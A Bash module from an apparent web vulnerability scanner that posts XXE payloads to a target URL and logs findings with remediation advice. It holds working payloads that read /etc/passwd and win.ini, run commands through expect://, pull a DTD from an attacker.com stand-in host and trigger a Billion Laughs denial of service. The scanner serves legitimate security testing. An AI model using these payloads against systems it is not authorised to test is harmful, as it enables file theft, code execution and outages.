#!/bin/bash

# XXE (XML External Entity) Testing Module
# Tests for XXE injection vulnerabilities

source "$(dirname "${BASH_SOURCE[0]}")/../../core/logger.sh"
source "$(dirname "${BASH_SOURCE[0]}")/../../core/database.sh"

# Main XXE testing function
test_xxe() {
    local url=$1
    local project_id=$2

    log_info "Testing XXE vulnerabilities on $url"

    # Test basic XXE
    test_xxe_basic "$url" "$project_id"

    # Test blind XXE
    test_xxe_blind "$url" "$project_id"
}

# Test basic XXE (with direct output)
test_xxe_basic() {
    local url=$1
    local project_id=$2

    log_info "[XXE] Testing basic XXE injection"

    # XXE payloads for file disclosure
    local xxe_payloads=(
        # Basic /etc/passwd disclosure
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><root>&xxe;</root>'

        # With different encodings
        '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'

        # PHP wrapper
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]><root>&xxe;</root>'

        # Expect wrapper (if expect extension loaded)
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "expect://id">]><root>&xxe;</root>'

        # OOB XXE
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">%xxe;]><root></root>'
    )

    # Test on endpoints that might accept XML
    test_xxe_on_endpoint "$url" "$project_id" "${xxe_payloads[@]}"
}

# Test XXE on specific endpoint
test_xxe_on_endpoint() {
    local url=$1
    local project_id=$2
    shift 2
    local payloads=("$@")

    for payload in "${payloads[@]}"; do
        log_debug "[XXE] Testing payload: ${payload:0:80}..."

        # Test with XML Content-Type
        local response=$(curl -s -L --max-time 10 \
                         -X POST "$url" \
                         -H "Content-Type: application/xml" \
                         -H "Accept: application/xml" \
                         -d "$payload" \
                         2>/dev/null)

        # Check for file disclosure indicators
        if echo "$response" | grep -qE "root:x:[0-9]+:0:|root:.*:/bin/(ba)?sh"; then
            log_critical "[XXE] XXE vulnerability found - /etc/passwd disclosed!"

            db_add_finding "$project_id" "critical" "xxe_file_disclosure" \
                "XXE - XML External Entity File Disclosure" \
                "URL: $url\nPayload: $payload\n\nSuccessfully retrieved /etc/passwd via XXE injection.\n\nThis vulnerability allows reading arbitrary files from the server." \
                "" "9.1" \
                "CRITICAL:\n1. Disable external entity processing in XML parser\n2. Use less complex data formats (JSON)\n3. Update XML processors\n4. Implement input validation\n5. PHP: libxml_disable_entity_loader(true)\n6. Java: factory.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true)\n7. .NET: XmlReaderSettings.ProhibitDtd = true"

            save_xxe_evidence "$project_id" "$url" "$payload" "$response"
            return 0
        fi

        # Check for Windows files
        if echo "$response" | grep -qiE "\[extensions\]|\[fonts\]|; for 16-bit app support"; then
            log_critical "[XXE] XXE vulnerability found - Windows files disclosed!"

            db_add_finding "$project_id" "critical" "xxe_windows" \
                "XXE - XML External Entity Windows File Disclosure" \
                "URL: $url\nPayload: $payload\n\nSuccessfully retrieved Windows system files." \
                "" "9.1" \
                "CRITICAL - Disable XXE processing immediately"

            save_xxe_evidence "$project_id" "$url" "$payload" "$response"
            return 0
        fi

        # Check for PHP filter output (base64)
        if echo "$payload" | grep -q "base64-encode" && echo "$response" | grep -qE "^[A-Za-z0-9+/=]{100,}"; then
            log_critical "[XXE] XXE with PHP filter detected!"

            db_add_finding "$project_id" "critical" "xxe_php_filter" \
                "XXE - PHP Filter File Disclosure" \
                "URL: $url\nPayload: $payload\n\nPHP filter wrapper works via XXE, allowing base64-encoded file reading." \
                "" "9.0" \
                "CRITICAL - Disable XXE and review exposed files"

            save_xxe_evidence "$project_id" "$url" "$payload" "$response"
            return 0
        fi

        # Check for command execution
        if echo "$payload" | grep -q "expect://" && echo "$response" | grep -qE "uid=|gid=|groups="; then
            log_critical "[XXE] XXE with command execution detected!"

            db_add_finding "$project_id" "critical" "xxe_rce" \
                "XXE - Remote Code Execution via Expect Wrapper" \
                "URL: $url\nPayload: $payload\n\nCommand execution achieved via XXE and expect:// wrapper!" \
                "" "10.0" \
                "CRITICAL - IMMEDIATE ACTION:\n1. Disable XXE processing\n2. Disable expect PHP extension\n3. Audit server for compromise"

            save_xxe_evidence "$project_id" "$url" "$payload" "$response"
            return 0
        fi

        # Also test with SOAP Content-Type
        if [[ "$payload" == *"<?xml"* ]]; then
            local soap_response=$(curl -s -L --max-time 10 \
                                  -X POST "$url" \
                                  -H "Content-Type: text/xml" \
                                  -H "SOAPAction: test" \
                                  -d "$payload" \
                                  2>/dev/null)

            if echo "$soap_response" | grep -qE "root:x:|root:.*:/bin/"; then
                log_critical "[XXE] XXE vulnerability found in SOAP endpoint!"

                db_add_finding "$project_id" "critical" "xxe_soap" \
                    "XXE - XML External Entity in SOAP Service" \
                    "URL: $url\nPayload: $payload\n\nSOAP service is vulnerable to XXE injection." \
                    "" "9.1" \
                    "CRITICAL - Disable external entities in SOAP processor"

                save_xxe_evidence "$project_id" "$url" "$payload" "$soap_response"
                return 0
            fi
        fi
    done

    return 1
}

# Test blind XXE
test_xxe_blind() {
    local url=$1
    local project_id=$2

    log_info "[XXE] Testing blind XXE (OOB)"

    # For blind XXE, we would need an external server to receive callbacks
    # This is a simplified version that checks if external DTD loading is attempted

    local blind_payloads=(
        # Billion laughs attack (DOS)
        '<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;"><!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">]><lolz>&lol3;</lolz>'

        # External DTD (would need actual server)
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % dtd SYSTEM "http://example.com/evil.dtd">%dtd;]><root></root>'
    )

    for payload in "${blind_payloads[@]}"; do
        local start=$(date +%s)
        local response=$(curl -s -L --max-time 15 \
                         -X POST "$url" \
                         -H "Content-Type: application/xml" \
                         -d "$payload" \
                         2>/dev/null)
        local end=$(date +%s)
        local duration=$((end - start))

        # Check for billion laughs DOS (response time or error)
        if echo "$payload" | grep -q "lol" && [ $duration -ge 10 ]; then
            log_warn "[XXE] Possible XXE DOS vulnerability (Billion Laughs)"

            db_add_finding "$project_id" "high" "xxe_dos" \
                "XXE - Denial of Service (Billion Laughs)" \
                "URL: $url\nPayload: ${payload:0:200}...\n\nServer response delayed significantly, indicating vulnerability to entity expansion DOS." \
                "" "7.5" \
                "1. Limit entity expansion in XML parser\n2. Set entity expansion limits\n3. Disable external entities\n4. Implement request timeouts"

            return 0
        fi

        # Check for errors that indicate XXE parsing
        if echo "$response" | grep -qiE "entity|dtd|xml|parser error|external"; then
            log_warn "[XXE] XML parser processes external entities (potential blind XXE)"

            db_add_finding "$project_id" "medium" "xxe_potential_blind" \
                "Potential Blind XXE Vulnerability" \
                "URL: $url\n\nThe XML parser appears to process external entities, but direct file disclosure was not confirmed.\n\nManual testing with an external DTD server is recommended." \
                "" "6.5" \
                "1. Disable external entity processing\n2. Test with external callback server\n3. Review XML parser configuration"
        fi
    done

    return 1
}

# Helper: Save XXE evidence
save_xxe_evidence() {
    local project_id=$1
    local url=$2
    local payload=$3
    local response=$4

    local evidence_dir="data/projects/${project_id}/evidence/xxe"
    mkdir -p "$evidence_dir"

    local timestamp=$(date +%Y%m%d_%H%M%S)
    cat > "${evidence_dir}/xxe_${timestamp}.txt" <<EOF
XXE Evidence
URL: $url
Payload:
$payload

Captured: $(date)

Response (first 5000 chars):
${response:0:5000}
EOF
    log_debug "[XXE] Evidence saved"
}

# Export functions
export -f test_xxe
export -f test_xxe_basic
export -f test_xxe_blind
